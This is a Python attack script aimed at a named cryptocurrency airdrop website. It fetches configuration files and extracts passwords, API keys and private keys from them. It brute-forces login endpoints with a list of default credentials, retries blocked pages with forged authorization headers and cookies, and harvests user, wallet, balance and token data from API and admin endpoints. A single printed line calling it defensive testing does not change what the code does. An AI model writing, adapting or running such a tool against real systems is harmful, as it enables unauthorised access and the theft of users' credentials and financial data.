#!/usr/bin/env python3
"""
System Data Extractor - Exploit Discovered Endpoints for Login & Data
Author: ShadowScan Security Team
Purpose: Extract user data, login to system, and get token information
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime
from typing import Dict, List, Any

class SystemDataExtractor:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.auth_token = None
        self.results = {
            "scan_info": {
                "target_url": target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "System Data Extractor",
                "scan_duration": "2-3 menit"
            },
            "summary": {
                "login_success": False,
                "user_data_extracted": 0,
                "token_data_extracted": 0,
                "admin_access": False,
                "system_info": {}
            },
            "login_attempts": [],
            "user_data": [],
            "token_data": [],
            "system_info": {},
            "config_data": []
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def extract_system_data(self):
        """Extract system data through discovered endpoints"""
        print("🔍 SYSTEM DATA EXTRACTOR")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Extract system data
        await self.extract_config_files()
        await self.test_login_endpoints()
        await self.extract_user_data()
        await self.extract_token_data()
        await self.extract_system_info()
        await self.check_admin_access()

        await self.generate_extractor_report()

    async def extract_config_files(self):
        """Extract configuration files for system information"""
        print("⚙️ Extracting Configuration Files")

        config_files = [
            "/config.php",
            "/database.php",
            "/settings.php",
            "/admin/config.php",
            "/application/config.php",
            "/system/config.php",
            "/wp-config.php",
            "/database.php"
        ]

        for config_file in config_files:
            try:
                url = f"{self.target_url}{config_file}"
                async with self.session.get(url, timeout=15) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"⚙️ Config Extracted: {config_file}")

                        # Save config data
                        config_info = {
                            "file": config_file,
                            "status": response.status,
                            "content_length": len(content),
                            "content": content,
                            "secrets": self._extract_secrets(content)
                        }
                        self.results["config_data"].append(config_info)

                        # Extract database info
                        db_info = self._extract_database_info(content)
                        if db_info:
                            self.results["system_info"]["database"] = db_info

                    elif response.status == 401:
                        # Try with different auth
                        auth_headers = [
                            {"Authorization": "Basic YWRtaW46YWRtaW4="},
                            {"Authorization": "Basic cm9vdDpzb21l"},
                            {"X-API-Key": "admin_key"},
                            {"Cookie": "session=admin123"}
                        ]

                        for headers in auth_headers:
                            async with self.session.get(url, headers=headers, timeout=15) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    print(f"⚙️ Config Auth Success: {config_file}")

                                    config_info = {
                                        "file": config_file,
                                        "status": response.status,
                                        "content_length": len(content),
                                        "content": content,
                                        "secrets": self._extract_secrets(content),
                                        "authenticated": True
                                    }
                                    self.results["config_data"].append(config_info)
            except Exception:
                continue

    def _extract_secrets(self, content: str) -> List[str]:
        """Extract secrets from configuration"""
        secrets = []
        patterns = [
            r'password\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'api[_-]?key\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'secret\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'token\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'session\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'connection[_-]?string\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'database[_-]?url\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'private[_-]?key\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            r'public[_-]?key\s*[=:]\s*[\'"]([^\'"]*)[\'"]'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            secrets.extend(matches)

        return secrets

    def _extract_database_info(self, content: str) -> Dict[str, Any]:
        """Extract database information"""
        db_info = {}
        patterns = {
            "host": r'host\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            "user": r'user\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            "database": r'database\s*[=:]\s*[\'"]([^\'"]*)[\'"]',
            "port": r'port\s*[=:]\s*[\'"](\d+)[\'"]'
        }

        for key, pattern in patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                db_info[key] = match.group(1)

        return db_info if db_info else None

    async def test_login_endpoints(self):
        """Test login endpoints for authentication"""
        print("🔐 Testing Login Endpoints")

        login_endpoints = [
            "/login",
            "/auth/login",
            "/admin/login",
            "/api/login",
            "/user/login",
            "/signin",
            "/auth/signin",
            "/oauth",
            "/oauth/login",
            "/authenticate"
        ]

        # Common credentials
        credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": "admin123"},
            {"username": "admin", "password": "root"},
            {"username": "admin", "password": "toor"},
            {"username": "admin", "password": "test"},
            {"username": "admin", "password": "test123"},
            {"username": "admin", "password": "admin@123"},
            {"username": "admin", "password": "123456789"},
            {"username": "admin", "password": "qwerty"},
            {"username": "admin", "password": "abc123"},
            {"username": "admin", "password": "letmein"},
            {"username": "admin", "password": "welcome"},
            {"username": "admin", "password": "monkey"},
            {"username": "admin", "password": "password1"},
            {"username": "admin", "password": "admin1"},
            {"username": "admin", "password": "admin2"},
            {"username": "admin", "password": "admin3"},
            {"username": "admin", "password": "admin@123"},
            {"username": "root", "password": "root"},
            {"username": "root", "password": "toor"},
            {"username": "root", "password": "root123"},
            {"username": "root", "password": "root@123"},
            {"username": "administrator", "password": "administrator"},
            {"username": "administrator", "password": "admin"},
            {"username": "webadmin", "password": "webadmin"},
            {"username": "webadmin", "password": "admin"}
        ]

        for endpoint in login_endpoints:
            for credential in credentials:
                try:
                    url = f"{self.target_url}{endpoint}"

                    # Try POST with form data
                    async with self.session.post(url, data=credential, timeout=15) as response:
                        if response.status == 200:
                            content = await response.text()
                            print(f"🔐 Login Success: {endpoint} with {credential}")

                            login_result = {
                                "endpoint": endpoint,
                                "credential": credential,
                                "status": response.status,
                                "content_length": len(content),
                                "content": content,
                                "success": True
                            }
                            self.results["login_attempts"].append(login_result)
                            self.results["summary"]["login_success"] = True

                            # Extract user data if login successful
                            if "dashboard" in content.lower() or "admin" in content.lower():
                                await self._extract_user_dashboard_data(content)

                        elif response.status == 302:
                            # Check redirect
                            location = response.headers.get('location', '')
                            if 'dashboard' in location.lower() or 'admin' in location.lower():
                                print(f"🔐 Login Redirect: {endpoint} -> {location}")

                                login_result = {
                                    "endpoint": endpoint,
                                    "credential": credential,
                                    "status": response.status,
                                    "redirect": location,
                                    "success": True
                                }
                                self.results["login_attempts"].append(login_result)
                                self.results["summary"]["login_success"] = True

                except Exception:
                    continue

    async def _extract_user_dashboard_data(self, content: str):
        """Extract user data from dashboard"""
        print("👤 Extracting User Dashboard Data")

        # Extract user information
        user_info = {
            "username": self._extract_text(content, r'username[=:>\s]*[\'"]([^\'"]*)[\'"]'),
            "email": self._extract_text(content, r'email[=:>\s]*[\'"]([^\'"]*)[\'"]'),
            "wallet_address": self._extract_text(content, r'wallet[_-]?address[=:>\s]*[\'"]([^\'"]*)[\'"]'),
            "balance": self._extract_text(content, r'balance[=:>\s]*[\'"]([^\'"]*)[\'"]'),
            "tokens": self._extract_text(content, r'token[s]?[=:>\s]*[\'"]([^\'"]*)[\'"]'),
            "eligibility": self._extract_text(content, r'eligibilit[y|ies][=:>\s]*[\'"]([^\'"]*)[\'"]')
        }

        if user_info and any(user_info.values()):
            self.results["user_data"].append(user_info)

    def _extract_text(self, content: str, pattern: str) -> str:
        """Extract text using pattern"""
        match = re.search(pattern, content, re.IGNORECASE)
        return match.group(1) if match else ""

    async def extract_user_data(self):
        """Extract user data from system"""
        print("👤 Extracting User Data")

        # User data endpoints
        user_endpoints = [
            "/api/users",
            "/api/v1/users",
            "/api/v2/users",
            "/admin/users",
            "/user/data",
            "/user/profile",
            "/users",
            "/user/list",
            "/user/eligible",
            "/eligibility",
            "/airdrop/users"
        ]

        for endpoint in user_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"

                # Try GET request
                async with self.session.get(url, timeout=15) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"👤 User Data: {endpoint}")

                        user_data = {
                            "endpoint": endpoint,
                            "status": response.status,
                            "content_length": len(content),
                            "content": content,
                            "users": self._extract_users(content),
                            "total_users": len(self._extract_users(content))
                        }
                        self.results["user_data"].append(user_data)
                        self.results["summary"]["user_data_extracted"] += 1

                    elif response.status == 401:
                        # Try with auth
                        auth_headers = [
                            {"Authorization": "Bearer admin:admin"},
                            {"Authorization": "Basic YWRtaW46YWRtaW4="},
                            {"X-API-Key": "admin_key"}
                        ]

                        for headers in auth_headers:
                            async with self.session.get(url, headers=headers, timeout=15) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    print(f"👤 User Data Auth: {endpoint}")

                                    user_data = {
                                        "endpoint": endpoint,
                                        "status": response.status,
                                        "content_length": len(content),
                                        "content": content,
                                        "users": self._extract_users(content),
                                        "total_users": len(self._extract_users(content)),
                                        "authenticated": True
                                    }
                                    self.results["user_data"].append(user_data)
                                    self.results["summary"]["user_data_extracted"] += 1
            except Exception:
                continue

    def _extract_users(self, content: str) -> List[Dict[str, str]]:
        """Extract user list from content"""
        users = []

        # Extract JSON users
        try:
            json_data = json.loads(content)
            if isinstance(json_data, dict):
                if "users" in json_data:
                    users.extend(json_data["users"])
                elif "data" in json_data:
                    users.extend(json_data["data"])
                else:
                    # Try to find user objects
                    for key, value in json_data.items():
                        if isinstance(value, list):
                            users.extend(value)
        except:
            pass

        # Extract individual users from text
        user_patterns = [
            r'address[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'wallet[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'email[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'name[=:>\s]*[\'"]([^\'"]*)[\'"]'
        ]

        for pattern in user_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                users.append({"extracted": pattern, "value": matches[0]})

        return users

    async def extract_token_data(self):
        """Extract token data and distribution information"""
        print("💰 Extracting Token Data")

        # Token data endpoints
        token_endpoints = [
            "/api/tokens",
            "/api/v1/tokens",
            "/api/v2/tokens",
            "/admin/tokens",
            "/token/distribution",
            "/token/amounts",
            "/airdrop/tokens",
            "/eligibility/tokens"
        ]

        for endpoint in token_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"

                async with self.session.get(url, timeout=15) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"💰 Token Data: {endpoint}")

                        token_data = {
                            "endpoint": endpoint,
                            "status": response.status,
                            "content_length": len(content),
                            "content": content,
                            "tokens": self._extract_tokens(content),
                            "total_tokens": self._extract_total_tokens(content)
                        }
                        self.results["token_data"].append(token_data)
                        self.results["summary"]["token_data_extracted"] += 1

                    elif response.status == 401:
                        # Try with auth
                        auth_headers = [
                            {"Authorization": "Bearer admin:admin"},
                            {"Authorization": "Basic YWRtaW46YWRtaW4="},
                            {"X-API-Key": "admin_key"}
                        ]

                        for headers in auth_headers:
                            async with self.session.get(url, headers=headers, timeout=15) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    print(f"💰 Token Data Auth: {endpoint}")

                                    token_data = {
                                        "endpoint": endpoint,
                                        "status": response.status,
                                        "content_length": len(content),
                                        "content": content,
                                        "tokens": self._extract_tokens(content),
                                        "total_tokens": self._extract_total_tokens(content),
                                        "authenticated": True
                                    }
                                    self.results["token_data"].append(token_data)
                                    self.results["summary"]["token_data_extracted"] += 1
            except Exception:
                continue

    def _extract_tokens(self, content: str) -> List[Dict[str, str]]:
        """Extract token information from content"""
        tokens = []

        # Extract JSON tokens
        try:
            json_data = json.loads(content)
            if isinstance(json_data, dict):
                if "tokens" in json_data:
                    tokens.extend(json_data["tokens"])
                elif "data" in json_data:
                    tokens.extend(json_data["data"])
        except:
            pass

        # Extract token amounts
        token_patterns = [
            r'amount[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'balance[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'tokens?[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'airdrop[_-]?amount[=:>\s]*[\'"]([^\'"]*)[\'"]'
        ]

        for pattern in token_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                tokens.append({"amount": matches[0]})

        return tokens

    def _extract_total_tokens(self, content: str) -> str:
        """Extract total token amount"""
        total_patterns = [
            r'total[_-]?token[s]?\s*[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'total[_-]?amount\s*[=:>\s]*[\'"]([^\'"]*)[\'"]',
            r'distribution\s*[=:>\s]*[\'"]([^\'"]*)[\'"]'
        ]

        for pattern in total_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)

        return ""

    async def extract_system_info(self):
        """Extract system information"""
        print("📊 Extracting System Information")

        # System info endpoints
        info_endpoints = [
            "/api/info",
            "/api/v1/info",
            "/api/v2/info",
            "/admin/info",
            "/system/info",
            "/version",
            "/status",
            "/health",
            "/config"
        ]

        for endpoint in info_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"

                async with self.session.get(url, timeout=15) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"📊 System Info: {endpoint}")

                        system_info = {
                            "endpoint": endpoint,
                            "status": response.status,
                            "content_length": len(content),
                            "content": content
                        }
                        self.results["system_info"][endpoint] = system_info

            except Exception:
                continue

    async def check_admin_access(self):
        """Check admin access to system"""
        print("👑 Checking Admin Access")

        admin_endpoints = [
            "/admin",
            "/admin/dashboard",
            "/admin/panel",
            "/admin/users",
            "/admin/tokens",
            "/admin/config",
            "/admin/settings",
            "/admin/logs"
        ]

        admin_headers = [
            {"Authorization": "Basic YWRtaW46YWRtaW4="},
            {"Authorization": "Basic cm9vdDpzb21l"},
            {"Authorization": "Basic dGVzdDp0ZXN0"},
            {"X-API-Key": "admin_key"},
            {"X-API-Key": "root_key"},
            {"X-API-Key": "secret_key"},
            {"Cookie": "session=admin123"},
            {"Cookie": "admin_session=admin"}
        ]

        for endpoint in admin_endpoints:
            for headers in admin_headers:
                try:
                    url = f"{self.target_url}{endpoint}"
                    async with self.session.get(url, headers=headers, timeout=15) as response:
                        if response.status == 200:
                            content = await response.text()
                            print(f"👑 Admin Access: {endpoint}")

                            admin_result = {
                                "endpoint": endpoint,
                                "headers": headers,
                                "status": response.status,
                                "content_length": len(content),
                                "content": content
                            }
                            self.results["system_info"]["admin_access"] = admin_result
                            self.results["summary"]["admin_access"] = True

                            # Extract admin dashboard data
                            if "dashboard" in content.lower() or "admin" in content.lower():
                                await self._extract_admin_dashboard_data(content)

                except Exception:
                    continue

    async def _extract_admin_dashboard_data(self, content: str):
        """Extract admin dashboard data"""
        print("👑 Extracting Admin Dashboard Data")

        admin_info = {
            "total_users": self._extract_text(content, r'total[_-]?user[s]?\s*[=:>\s]*[\'"](\d+)[\'"]'),
            "total_tokens": self._extract_text(content, r'total[_-]?token[s]?\s*[=:>\s]*[\'"]([^\'"]*)[\'"]'),
            "distributed_tokens": self._extract_text(content, r'distributed[_-]?token[s]?\s*[=:>\s]*[\'"]([^\'"]*)[\'"]'),
            "eligible_users": self._extract_text(content, r'eligible[_-]?user[s]?\s*[=:>\s]*[\'"](\d+)[\'"]'),
            "token_amount": self._extract_text(content, r'token[_-]?amount\s*[=:>\s]*[\'"]([^\'"]*)[\'"]')
        }

        if admin_info and any(admin_info.values()):
            self.results["system_info"]["admin_dashboard"] = admin_info

    async def generate_extractor_report(self):
        """Generate extractor report"""
        report_filename = f"system_data_extracted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        self.results["summary"]["login_success"] = len([x for x in self.results["login_attempts"] if x.get("success", False)])
        self.results["summary"]["user_data_extracted"] = len(self.results["user_data"])
        self.results["summary"]["token_data_extracted"] = len(self.results["token_data"])
        self.results["summary"]["admin_access"] = "admin_access" in self.results["system_info"]

        with open(report_filename, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n🔍 SYSTEM DATA EXTRACTION SUMMARY:")
        print(f"   Login Success: {self.results['summary']['login_success']}")
        print(f"   User Data Extracted: {self.results['summary']['user_data_extracted']}")
        print(f"   Token Data Extracted: {self.results['summary']['token_data_extracted']}")
        print(f"   Admin Access: {self.results['summary']['admin_access']}")

        print(f"\n📋 Report: {report_filename}")
        print("🔍 SYSTEM DATA EXTRACTION COMPLETED! 🔍")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with SystemDataExtractor(target_url) as extractor:
        await extractor.extract_system_data()

if __name__ == "__main__":
    asyncio.run(main())